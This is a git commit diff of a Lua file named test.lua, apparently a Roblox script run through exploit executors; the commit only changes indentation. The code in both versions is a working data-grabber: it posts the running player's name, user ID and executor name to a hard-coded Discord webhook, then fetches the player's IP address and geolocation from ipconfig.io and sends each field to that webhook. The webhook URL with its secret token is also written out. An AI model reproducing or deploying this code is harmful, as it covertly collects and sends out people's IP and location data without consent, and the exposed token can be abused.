eccc9bcfa2bab0898f27c15a401d0d5b237a2ec6
XdZdE <39117649+XdZdE@users.noreply.github.com>
2024-04-08 10:11:58 -0700

    Update test.lua

--- test.lua
+++ test.lua
@@ -1,22 +1,22 @@
 return function()
-local Player = game.Players.LocalPlayer
-local url = "https://discord.com/api/webhooks/1226933576944189520/7mck8mDESiAh0oU8wcY9entcJZX-JqL2qS17p1m8_ZnNiMGlGBIha2ipiLxPt0Ohexdp"
-local data = {
-   ["content"] = "Player "..Player.Name.." ("..tostring(Player.UserId)..") has been caught exploiting with: "..getexecutorname(),
-}
-local newdata = game:GetService("HttpService"):JSONEncode(data)
+	local Player = game.Players.LocalPlayer
+	local url = "https://discord.com/api/webhooks/1226933576944189520/7mck8mDESiAh0oU8wcY9entcJZX-JqL2qS17p1m8_ZnNiMGlGBIha2ipiLxPt0Ohexdp"
+	local data = {
+		["content"] = "Player "..Player.Name.." ("..tostring(Player.UserId)..") has been caught exploiting with: "..getexecutorname(),
+	}
+	local newdata = game:GetService("HttpService"):JSONEncode(data)
 
-local headers = {
-   ["content-type"] = "application/json"
-}
-request = http_request or request or HttpPost or syn.request
-local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-request(abcdef)
+	local headers = {
+		["content-type"] = "application/json"
+	}
+	request = http_request or request or HttpPost or syn.request
+	local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+	request(abcdef)
 
-for i,v in game.HttpService:JSONDecode(game:HttpGet("https://ipconfig.io/json")) do
-data["content"] = tostring(i)..":"..tostring(v)
-local newdatanew = game:GetService("HttpService"):JSONEncode(data)
-local newabc = {Url = url, Body = newdatanew, Method = "POST", Headers = headers}
-request(newabc)
-end
+	for i,v in game.HttpService:JSONDecode(game:HttpGet("https://ipconfig.io/json")) do
+		data["content"] = tostring(i)..":"..tostring(v)
+		local newdatanew = game:GetService("HttpService"):JSONEncode(data)
+		local newabc = {Url = url, Body = newdatanew, Method = "POST", Headers = headers}
+		request(newabc)
+	end
 end
